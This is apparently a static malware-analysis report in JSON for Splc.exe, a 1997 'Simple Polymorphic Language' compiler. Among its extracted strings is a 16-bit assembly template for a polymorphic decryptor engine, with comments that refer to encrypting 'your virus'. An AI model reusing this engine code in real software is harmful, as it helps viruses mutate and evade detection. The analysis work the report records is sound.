            "_heapchk fails with _HEAPBADPTR.",
            "_heapchk fails with _HEAPBADEND.",
            "_heapchk fails with _HEAPBADNODE.",
            "_heapchk fails with _HEAPBADBEGIN.",
            "Bad memory block found at 0x%08X.",
            "_CrtMemCheckPoint: NULL state pointer.",
            "_CrtMemDifference: NULL state pointer.",
            "Object dump complete.",
            "crt block at 0x%08X, subtype %x, %u bytes long.",
            "normal block at 0x%08X, %u bytes long.",
            "client block at 0x%08X, subtype %x, %u bytes long.",
            "{%ld} ",
            "%hs(%d) : ",
            "#File Error#(%d) : ",
            "Dumping objects ->",
            " Data: <%s> %s",
            "%.2X ",
            "Detected memory leaks!",
            "Total allocations: %ld bytes.",
            "Largest number used: %ld bytes.",
            "%ld bytes in %ld %hs Blocks.",
            "_sftbuf.c",
            "flag == 0 || flag == 1",
            "_file.c",
            "(null)",
            " (8PX",
            "700WP",
            "``````",
            "ppxxxx",
            "output.c",
            "ch != _T('\\0')",
            "Assertion Failed",
            "Error",
            "Warning",
            "%s(%d) : %s",
            "Assertion failed!",
            "Assertion failed: ",
            "_CrtDbgReport: String too long or IO Error",
            "Second Chance Assertion Failed: File %s, Line %d",
            "wsprintfA",
            "user32.dll",
            "Microsoft Visual C++ Debug Library",
            "Debug %s!",
            "Program: %s%s%s%s%s%s%s%s%s%s%s",
            "(Press Retry to debug the application)",
            "Module: ",
            "File: ",
            "Line: ",
            "Expression: ",
            "For information on how your program can cause an assertion",
            "failure, see the Visual C++ documentation on asserts.",
            "<program name unknown>",
            "dbgrpt.c",
            "szUserMessage != NULL",
            "aw_str.c",
            "_freebuf.c",
            "stream != NULL",
            "ioinit.c",
            "_getbuf.c",
            "_open.c",
            "filename != NULL",
            "stream.c",
            "?GetCurrentThread",
            "SetThreadAffinityMask",
            "GetCurrentProcess",
            "GetProcessAffinityMask",
            "KERNEL32",
            "e+000",
            "stdenvp.c",
            "stdargv.c",
            "aw_env.c",
            "runtime error ",
            "TLOSS error",
            "SING error",
            "DOMAIN error",
            "R6027",
            "- not enough space for lowio initialization",
            "R6026",
            "- not enough space for stdio initialization",
            "R6025",
            "- pure virtual function call",
            "R6024",
            "- not enough space for _onexit/atexit table",
            "R6019",
            "- unable to open console device",
            "R6018",
            "- unexpected heap error",
            "R6017",
            "- unexpected multithread lock error",
            "R6016",
            "- not enough space for thread data",
            "abnormal program termination",
            "R6009",
            "- not enough space for environment",
            "R6008",
            "- not enough space for arguments",
            "R6002",
            "- floating point not loaded",
            "Microsoft Visual C++ Runtime Library",
            "Runtime Error!",
            "Program: ",
            "sprintf.c",
            "(\"inconsistent IOB fields\", stream->_ptr - stream->_base >= 0)",
            "_flsbuf.c",
            "vsprintf.c",
            "GetLastActivePopup",
            "GetActiveWindow",
            "MessageBoxA",
            "osfinfo.c",
            "aw_map.c",
            "chsize.c",
            "size >= 0",
            "1#QNAN",
            "1#INF",
            "1#IND",
            "1#SNAN",
            "SIMPLE POLYMORfIC LANGUAGE Compiler Version 1.0a",
            "ANAX (c)1997 Greece. ",
            "ERROR : %s ",
            "ERROR in Line(%d): %s ",
            "Read macros",
            "#define ",
            "Too many defined Macros.",
            "Expected a Variable",
            "Redefine of Macro.",
            "Read Variables",
            "randvar",
            "offsetlow",
            "offsethigh",
            "carry",
            "char ",
            "Too many variables. Try to use 'randvar'.",
            "Expected a Variable",
            "Redefine of Variable.",
            "Redefine of Macro as Variable.",
            "Expected a ',' or ';'",
            "Unexpected end of file.",
            "Too long chain of Macros.",
            "No Command-line arguments.",
            "Usage: SPLC  [d:\\[path]]\\filename[.SPL] ",
            "Enter .SPL filename:",
            "Can't open file: %s ",
            "Read file:%s",
            "Remove Comments.",
            "Too big source file",
            "Can't open file: %s ",
            "Write file:%s",
            ";SIMPLE POLYMORfIC LANGUAGE",
            ";Version 1.0",
            ";(c)1997 by ANAX",
            ";Adresses of Variable",
            "DS:%04d ",
            "Can't open file: %s ",
            "Write file:%s",
            ";SIMPLE POLYMORfIC LANGUAGE Version 1.0",
            ";(c)1997 by ANAX",
            ";This file contain two fuctions which you must include in your",
            ";source file.",
            ";------------------------------------------------------",
            ";Fuction <splrand>",
            ";The random number generator.",
            ";You must call this fuction before <sple>.",
            ";Input:",
            ";DS= Segment adress of a reserved memory block.",
            ";    The block must be at least %d bytes long",
            ";Output:",
            ";splrand sets all variables to random values.",
            ";Registers and Flags are not effected.",
            ";------------------------------------------------------",
            "splrand PROC NEAR ",
            "        PUSHF ",
            "        PUSH AX ",
            "        PUSH BX ",
            "        XOR BX,BX ",
            "splrandloop: ",
            "        IN AL,040h ",
            "        ADD AL,[BX-1] ",
            "        XOR DS:[BX],AL ",
            "        INC BX ",
            "        CMP BX,256 ",
            "        JNZ splrandloop ",
            "        POP BX ",
            "        POP AX ",
            "        POPF ",
            "        RET ",
            "splrand ENDP ",
            ";------------------------------------------------------",
            ";------------------------------------------------------",
            ";Fuction <sple> ",
            ";The SPL Engine. ",
            ";Input: ",
            ";DS= Segment adress of a reserved memory block. ",
            ";    The block must be at least %d bytes long. ",
            ";    This memory block, must first be initialized ",
            ";    with <splrand> fuction. ",
            ";ES= Segment adress of the second memory block. ",
            ";    Its the buffer where your SPL program will put ",
            ";    the decryptor and possible you would also like ",
            ";    to put there the encrypted image of your virus.",
            ";    So, the size of this buffer depents on you.",
            ";Output:",
            ";Registers and Flags are not effected.",
            ";------------------------------------------------------",
            "sple    PROC NEAR   ",
            ";Save registers AX,BX,CX,DX,SI,DI  ",
            "        PUSHF ",
            "        PUSH AX ",
            "        PUSH BX ",
            "        PUSH CX ",
            "        PUSH DX ",
            "        PUSH SI ",
            "        PUSH DI ",
            ";decompress spldata[] into DS:100  ",
            "        PUSH ES  ",
            "        PUSH DS  ",
            "        PUSH DS  ",
            "        POP ES  ",
            "        PUSH CS   ",
            "        POP DS   ",
            "        MOV CX,%d ",
            "        Call $+3  ",
            "splDelta:POP SI ",
            "        SUB SI,offset splDelta   ",
            "        ADD SI,offset spldata ",
            "        MOV DI,256 ",
            "        MOV DL,DS:[SI] ",
            "        INC SI   ",
            "spldec0:MOV AX,DS:[SI] ",
            "        INC SI   ",
            "        CMP AL,DL    ",
            "        JNZ spldec1   ",
            "        INC SI   ",
            "        CMP AH,0FFh ",
            "        JZ spldec1   ",
            "        MOV AL,AH  ",
            "        MOV AH,0     ",
            "        SUB CX,AX    ",
            "        PUSH CX    ",
            "        MOV CX,AX    ",
            "        MOV AX,DS:[SI]  ",
            "        INC SI    ",
            "        INC SI    ",
            "        PUSH SI    ",
            "        MOV SI,DI    ",
            "        SUB SI,AX    ",
            "spldec2:MOV AL,ES:[SI]    ",
            "        INC SI    ",
            "        MOV ES:[DI],AL    ",
            "        INC DI    ",
            "        LOOP spldec2   ",
            "        POP SI   ",
            "        POP CX   ",
            "        CMP CX,0   ",
            "        JZ spldec3   ",
            "        JMP spldec0   ",
            "spldec1:MOV ES:[DI],AL  ",
            "        INC DI    ",
            "        LOOP spldec0    ",
            "spldec3:POP DS    ",
            "        POP ES    ",
            ";initialize registers and call the interpreter ",
            "        MOV SI,256 ",
            "        MOV WORD PTR DS:[1],0 ; SPL_BUFFER_PTR STARTING VALUE ",
            "        CALL spltranslateinstr ",
            ";Restore AX,BX,CX,DX,SI.DI ",
            "        POP DI ",
            "        POP SI ",
            "        POP DX ",
            "        POP CX ",
            "        POP BX ",
            "        POP AX ",
            "        POPF ",
            "        RET  ;exit   ",
            "spltranslateinstr: ",
            "        XOR BX,BX ",
            "        IN AL,40h ",
            "        MOV DS:[0],AL ",
            "        PUSH SI ",
            "        MOV AL,DS:[SI] ",
            "spl2:   CMP AL,%d  ",
            "        JNZ spl3  ",
            "        INC SI ",
            "splinstr2:         ",
            "        call spltranslateinstr ",
            "        CALL splgetinstrsize ",
            "        ADD SI,AX ",
            "        JMP splinstr2 ",
            "spl3:   CMP AL,%d ",
            "        JNZ spl4  ",
            "        INC SI  ",
            "spl3again:MOV AL,DS:[SI] ",
            "        CMP AL,%d ",
            "        JZ spl3next ",
            "        CMP AL,%d ",
            "        JZ spl3next ",
            "spl3exec:call spltranslateinstr ",
            "        POP SI   ",
            "        RET    ",
            "spl3next:CALL splgetinstrsize ",
            "        ADD SI,AX ",
            "        JMP spl3again ",
            "spl4:   CMP AL,%d ",
            "        JNZ spl5  ",
            "        mov al,ds:[si+1] ",
            "        xlat ",
            "spl4again:POP si ",
            "        PUSH SI",
            "        ADD SI,2",
            "        XOR BL,BL ",
            "spl4next:cmp byte ptr ds:[SI],%d ",
            "        jz spl4DIV ",
            "        cmp AL,BL ",
            "        jz spl4end ",
            "        INC BL ",
            "        PUSH AX ",
            "        call splgetinstrsize ",
            "        add SI,AX ",
            "        POP AX ",
            "        JMP spl4next ",
            "spl4div:XOR AH,AH ",
            "\t\t DIV BL  ",
            "        MOV AL,AH ",
            "        JMP spl4again ",
            "spl4end:         ",
            "        call spltranslateinstr ",
            "        POP SI ",
            "        PUSH SI ",
            "        JMP splnopping ",
            "spl5:   CMP AL,%d ",
            "        JNZ spl6  ",
            "spl5again:IN AL,40h ",
            "spl5again2:POP si ",
            "        PUSH SI",
            "        ADD SI,1",
            "        XOR BL,BL ",
            "spl5next: ",
            "        cmp byte ptr ds:[SI],%d ",
            "        jz spl5div ",
            "        cmp byte ptr ds:[SI],%d ",
            "        jz spl5pass ",
            "        cmp byte ptr ds:[SI],%d ",
            "        jz spl5pass ",
            "        CMP AL,BL  ",
            "        JZ spl5exec ",
            "        INC BL ",
            "spl5pass:PUSH AX ",
            "        call splgetinstrsize ",
            "        add SI,AX ",
            "        POP AX ",
            "        JMP spl5next ",
            "spl5div:TEST BL,BL ",
            "        JZ spl5exec ",
            "           ",
            "        XOR AH,AH ",
            "\t\t DIV BL  ",
            "        MOV AL,AH ",
            "        JMP spl5again2 ",
            "spl5exec:call spltranslateinstr ",
            "        JMP spl5again ",
            "spl6:   CMP AL,%d ",
            "        JNZ spl7  ",
            "        POP SI ",
            "        RET ",
            "spl7:   CMP AL,%d ",
            "        JNZ spl8  ",
            "        POP SI ",
            "        RET ",
            "spl8:   CMP AL,%d ",
            "        JNZ spl9  ",
            "        POP SI ",
            "        POP SI ",
            "        POP SI ",
            "        PUSH SI ",
            "        JMP splnopping ",
            "spl9:   CMP AL,%d",
            "        JNZ spl10  ",
            "        MOV AL,DS:[SI+2]  ",
            "        JMP spl10c    ",
            "spl10:  CMP AL,%d",
            "        JNZ spl11  ",
            "        MOV DI,DS:[SI+2]  ",
            "        AND DI,00FFh   ",
            "        MOV AL,DS:[DI]  ",
            "spl10c: MOV DI,DS:[SI+1]  ",
            "        AND DI,00FFh      ",
            "        MOV DS:[DI],AL    ",
            "        JMP splnopping    ",
            "spl11:  CMP AL,%d",
            "        JNZ spl12  ",
            "        MOV AL,DS:[SI+2]  ",
            "        JMP spl12c    ",
            "spl12:  CMP AL,%d",
            "        JNZ spl13 ",
            "        MOV DI,DS:[SI+2]  ",
            "        AND DI,00FFh   ",
            "        MOV AL,DS:[DI]  ",
            "spl12c: MOV DI,DS:[SI+1]  ",
            "        AND DI,00FFh      ",
            "        ADD DS:[DI],AL    ",
            "        MOV AL,0     ",
            "        ADC AL,0     ",
            "        MOV DS:[3],AL   ",
            "        JMP splnopping    ",
            "spl13:  CMP AL,%d",
            "        JNZ spl14  ",
            "        MOV AL,DS:[SI+2]  ",
            "        JMP spl14c    ",
            "spl14:  CMP AL,%d",
            "        JNZ spl15 ",
            "        MOV DI,DS:[SI+2]  ",
            "        AND DI,00FFh   ",
            "        MOV AL,DS:[DI]  ",
            "spl14c: MOV DI,DS:[SI+1]  ",
            "        AND DI,00FFh      ",
            "        SUB DS:[DI],AL    ",
            "        MOV AL,0     ",
            "        ADC AL,0     ",
            "        MOV DS:[3],AL   ",
            "        JMP splnopping    ",
            "spl15:  CMP AL,%d",
            "        JNZ spl16  ",
            "        MOV AL,DS:[SI+2]  ",
            "        JMP spl16c    ",
            "spl16:  CMP AL,%d",
            "        JNZ spl17 ",
            "        MOV DI,DS:[SI+2]  ",
            "        AND DI,00FFh   ",
            "        MOV AL,DS:[DI]  ",
            "spl16c: MOV DI,DS:[SI+1]  ",
            "        AND DI,00FFh      ",
            "        XOR DS:[DI],AL    ",
            "        JMP splnopping    ",
            "spl17:  CMP AL,%d",
            "        JNZ spl18  ",
            "        MOV AL,DS:[SI+2]  ",
            "        JMP spl18c    ",
            "spl18:  CMP AL,%d",
            "        JNZ spl19 ",
            "        MOV DI,DS:[SI+2]  ",
            "        AND DI,00FFh   ",
            "        MOV AL,DS:[DI]  ",
            "spl18c: MOV DI,DS:[SI+1]  ",
            "        AND DI,00FFh      ",
            "        AND DS:[DI],AL    ",
            "        JMP splnopping    ",
            "spl19:  CMP AL,%d",
            "        JNZ spl20  ",
            "        MOV AL,DS:[SI+2]  ",
            "        JMP spl20c    ",
            "spl20:  CMP AL,%d",
            "        JNZ spl23 ",
            "        MOV DI,DS:[SI+2]  ",
            "        AND DI,00FFh   ",
            "        MOV AL,DS:[DI]  ",
            "spl20c: MOV DI,DS:[SI+1]  ",
            "        AND DI,00FFh      ",
            "        OR DS:[DI],AL    ",
            "        JMP splnopping    ",
            "spl23:  CMP AL,%d",
            "        JNZ spl24  ",
            "        MOV AL,DS:[SI+1]  ",
            "        XLAT ",
            "        JMP spl25 ",
            "spl24:  CMP AL,%d ",
            "        JNZ spl25  ",
            "        MOV AL,DS:[SI+1]  ",
            "spl25:  MOV DI,DS:[1] ",
            "        MOV ES:[DI],AL ",
            "        INC WORD PTR DS:[1] ",
            "        JMP splnopping ",
            "splnopping: ",
            "        CALL splgetinstrsize ",
            "        CMP AL,1 ",
            "        JZ splonenop ",
            "        MOV BYTE PTR DS:[SI],%d ",
            "        ADD SI,AX  ",
            "        DEC SI ",
            "        MOV BYTE PTR DS:[SI],%d ",
            "        JMP splreturning ",
            "splonenop: ",
            "        MOV BYTE PTR DS:[SI],%d ",
            "splreturning: ",
            "        POP SI ",
            "        RET ",
            "splgetinstrsize:  ",
            "        MOV AL,DS:[SI]   ",
            "        CMP AL,%d\t\t ",
            "        JB splget2  ",
            "        PUSH SI ",
            "        CMP AL,%d  ",
            "        JNZ splget4 ",
            "        INC SI      ",
            "splget4:INC SI         ",
            "splget5:CMP byte ptr DS:[SI],%d ",
            "        JNZ splget3\t   ",
            "        MOV AX,SI\t ",
            "        POP SI\t  ",
            "        SUB AX,SI ",
            "        INC AX\t ",
            "        RET\t\t ",
            "splget3:call splgetinstrsize ",
            "        ADD SI,AX    ",
            "        JMP splget5  ",
            "splget2:      ",
            "       CMP AL,248  ",
            "       JNC splget6 ",
            "       CMP AL,234   ",
            "       JNC splthreebytes   ",
            "splget6:        ",
            "       CMP AL,%d   ",
            "       JZ spltwobytes   ",
            "       CMP AL,%d   ",
            "       JZ spltwobytes   ",
            "splonebyte:   ",
            "        MOV AX,1 ",
            "        RET   ",
            "spltwobytes:  ",
            "        MOV AX,2 ",
            "        RET   ",
            "splthreebytes: ",
            "        MOV AX,3 ",
            "        RET ",
            "sple   ENDP   ",
            ";------------------------------------------------------",
            ";------------------------------------------------------",
            ";This virtually is your SPL program. ",
            ";<sple> fuction decompress and execute those data. ",
            ";------------------------------------------------------",
            "spldata DB ",
            "%03d",
            "        DB ",
            "Expected a Number.",
            "Too long number.",
            "Unknown instruction.",
            "Unknown instruction.",
            "Expected a variable.",
            "Expected a variable or a number.",
            "Expected '('.",
            "Expected a variable.",
            "Expected ','.",
            "Expected a variable.",
            "Expected a variable or a number.",
            "Expected ')'.",
            "Expected '('.",
            "Expected ';' or ')'.",
            "Expected '('.",
            "Expected ';' or ')'.",
            "Expected '('.",
            "Expected ';' or ')'.",
            "Expected '('.",
            "Expected a variable.",
            "Expected ','.",
            "Expected ';' or ')'.",
            "Unexpected end of file. Check for Open Brackets.",
            "Unknown instruction/fuction/macro.",
            "Compiling...",
            "Can't find fuction 'spl(...)'",
            "Compile Succesful.",
            "Compressing Data...",
            "Ratio: %-2.2f ",
            "N@ p+\u015di@]%",
            "@q\u05d5C",
            "@<\u0566I",
            "x@oGAkU'9p|B\u074e~QCv)/&D(",
            "DJzEe\u01d1",
            "uuvHMXB\u49d39;5SM]=];Z] T7aZ%]g']\u0740nL\u025b ",
            "R`%u",
            "\u05e3?Zd;On",
            "G\u0167?@il",
            "7?3=Bz\u0554?a",
            "w\u032b?/L[M\u013e?S;uD",
            "?g9E",
            "\u03d4?$#\u2f3a;1az?aUY~S|",
            "D?$?9'",
            "*?}d|FU>c{",
            "#Tw=:",
            "zc%C1<!8G",
            ";\u0184EB",
            "u7.:3q",
            "#2IZ9W\u06a52h",
            ",%I-64OSk%Y",
            "ZW<P\"",
            "NKeb",
            "ExitProcess",
            "TerminateProcess",
            "GetCurrentProcess",
            "GetCommandLineA",
            "GetVersion",
            "IsBadWritePtr",
            "IsBadReadPtr",
            "HeapValidate",
            "DebugBreak",
            "GetStdHandle",
            "InterlockedDecrement",
            "OutputDebugStringA",
            "WriteFile",
            "GetProcAddress",
            "LoadLibraryA",
            "InterlockedIncrement",
            "GetModuleFileNameA",
            "GetStringTypeA",
            "WideCharToMultiByte",
            "GetStringTypeW",
            "MultiByteToWideChar",
            "GetLastError",
            "CloseHandle",
            "SetHandleCount",
            "GetFileType",
            "GetStartupInfoA",
            "ReadFile",
            "GetModuleHandleA",
            "RtlUnwind",
            "UnhandledExceptionFilter",
            "FreeEnvironmentStringsA",
            "GetEnvironmentStrings",
            "FreeEnvironmentStringsW",
            "GetEnvironmentStringsW",
            "GetCPInfo",
            "GetACP",
            "GetOEMCP",
            "HeapCreate",
            "HeapDestroy",
            "HeapAlloc",
            "HeapReAlloc",
            "HeapFree",
            "HeapUnlock",
            "HeapWalk",
            "HeapLock",
            "SetConsoleCtrlHandler",
            "SetStdHandle",
            "FlushFileBuffers",
            "SetFilePointer",
            "CreateFileA",
            "LCMapStringA",
            "LCMapStringW",
            "SetEndOfFile",
            "KERNEL32.dll",
            "71D1Q1i1n1{111111111111111,2?2233+4=4l444466666",
            "7@7R77777",
            "8#88d9y99999999999",
            ":7:X:e:q:x::::::::!;Y;f;",
            "<(<<",
            "=%=@=q>>>>>",
            "?8?S?`?q???????",
            "0(0X0z00000000",
            "1*1;1L1]1n1y11111111",
            "2#242E2V2g2x22222222",
            "3\"333D3U3f3q333333333",
            "4,4=4N4_4p444444444\t5",
            "5+5<5B5S5d5u555555555",
            "606A6R6c6t666666666",
            "7/7@7Q7b7s777777777",
            "8.8?8P8a8r888888888",
            "9-9C9T9e9v99999999",
            ":*:@:Q:b:s::::::::",
            ";\";3;D;Z;k;|;;;;;;;;",
            "<&<7<H<Y<j<{<<<<<<<<",
            "=/=@=V=g=}========",
            ">'>8>I>Z>k>|>>>>>>>>",
            "?0?A?W?h?y????????",
            "0-0>0O0`0q00000000",
            "1%161G1X1i1z11111111",
            "2.2?2P2a2r222222222",
            "3!373H3Y3j3{33333333",
            "4/4@4Q4b4s44444444",
            "5'585I5Z5k5|55555555",
            "606A6R6c6t66666666",
            "7-7>7O7`7q77777777",
            "8*8;8L8]8n8",
            "88888888",
            "9.9?9U9f9w999999999",
            ":!:2:C:T:e:v:::::::",
            ";*;i;;;",
            "<<<<<\\=",
            ">?>S>Y>`>>>>>>",
            "?I?e????",
            "0%0,050H0]0h0n0t00",
            "1C1]1o111192]222222222222",
            "3=3i333333",
            "464K4Q4W444",
            "5=55555555",
            "666666666i7",
            "7777777",
            "8)848:8@888",
            "9m:::::::::::::",
            "< <%<?<d<>?",
            "0????",
            "0000000",
            "11161C1H1V1u111",
            "2,2H2\\2224444",
            "5556677d8m88888889999::",
            "<,<W<<=;>b>f>l>p>v>z>>>>>>>>>>>>>>>",
            "?&?B?G?Q?W?d??????",
            "0;0]0011111",
            "2\"2F2K222",
            "3]333333333",
            "4L4U4n44$6=6I6b6j66666",
            "7e7j777",
            "8}88",
            "9#939<9A9G9R9W9999",
            ":[:f:r:::::::",
            ";0;;",
            "<K<[<`<<<",
            "=.=<=t=z====*>6>[>>>>>",
            "?'?F?j?x?????",
            ";0T0`0000\t1\\1h11192E2z222B3",
            "33333333#4(4d4h4l4p4t444",
            "5:5b5555F6w66666j777",
            "88*959d9i999N:r:}:::w;;;",
            "<{<<<",
            "=c====8>h>m>>",
            "?<?i????",
            "W0s000",
            "1J1g1111111^2j2",
            "3'343B3K3Y3_3l3z333333",
            "4$4@4n44",
            "585{55`6g6k6o6s6w6{6",
            "67777",
            "99:;;",
            "<{???????????????????",
            "2 2$2374]4m444444",
            "5:5E5555\t6",
            "6'64696?6]6j6z6",
            "6666677C7W77777",
            "8)8:8k8r8|88888 9&9W9c9999;:p:::::",
            ";;;@;a;f;;;;;;;;",
            "<{<<<<<<<<",
            "=8=Z=u===",
            ">L>>>>",
            "?!?/?E?[?x?????",
            "0D0N1c1|111112a2j2k4z44444O5}5555)696Z6o6u66",
            "7[777I8P888888",
            "9J9s9999",
            ":%:8:D::::\t;%;h;;;J<Z<h<<<====:>Z>c>>>>>",
            "00000",
            "2\"252K2b2w222;3u333",
            "5!5'5A555O6j6~666r7",
            "8*8/8?88888d9t9999",
            ":t::::h;;",
            "<,<5<<<<<<",
            "='=?=]={======",
            ">1>\\>s>}>>",
            "?0?6?L???",
            "0!0&060C0e000A113/444444",
            "5r55555",
            "6!6]6666607[7h7{7777788O8t88888:9_999\t:4:g:::::::,;7;V;;;;-<9<F<K<Y<d<n<<<<<<",
            "=4==========*>6>@>h>>>>>>?",
            "0,090~0000000",
            "1$1:1N1\\11111",
            "2*2D222222",
            "383I3344",
            "55555",
            "6\"606?6I6v6{6666666",
            "7&7L7S7a7777",
            "8P8Y8|88'9F999999",
            ":L:l:::::<<c=t===l>>",
            "11111",
            "3#32373L3W3a3l3v33333333333g444'5;5O5c55555555555;6D6W6`6s66666",
            "7<7T7^777777777",
            "8!8'848G8X8q899999",
            ":L:P:T:X:\\:::",
            ";<;e;t;;;;",
            "<L<u<{<<<",
            "=6=G=X=====",
            ">$>:>V>e>t>>>>>",
            "?2?K?U???",
            "0U0~000000(131a1v1111\t222",
            "3K3[3~3333",
            "4^4s44444465R5",
            "6k6u666\"7)7-7175797=7778",
            "9L9_9|999",
            ":Q:(;D;k;};;;;;;;",
            "<*<N<p<<<<",
            "=T===>>>",
            "?)?7?j??????",
            "70^000",
            "1K11",
            "3455[555::\"=6=;=D=H=O=V=\\=b=>>>>>",
            "?L?P?T?X?\\???",
            "0)0F0O011",
            "2<2F2K24",
            "55555 6<6r66666<7C7f77",
            "8888::::::::::::::::::<;@;D;H;L;;;;;;<<?=D=y=~===??",
            "0(0W0s00003",
            "4n4t4z44444444444444444444444",
            "5\"5(5.545:5@5F5L5R5X5^5d5j5p5v5|55555555",
            "5$5H5L5P5T5X5h5p577 8$8(8H8L8P8T8X8\\8<;D;L;T;\\;d;l;t;|;;;;;;;;;;",
            "Splc.exe",
            "NB10",
            "C:\\UNGND\\myv\\spl\\Splc.pdb"
        ],
        "file": {
            "KERNEL32.dll": "Library",
            "Splc.exe": "Executable",
            "user32.dll": "Library"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.915986",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "packer_compiler_signatures.yar": "IsPE32"
        },
        {
            "packer_compiler_signatures.yar": "IsConsole"
        },
        {
            "packer_compiler_signatures.yar": "HasOverlay"
        },
        {
            "packer_compiler_signatures.yar": "HasDebugData"
        }
    ]
}
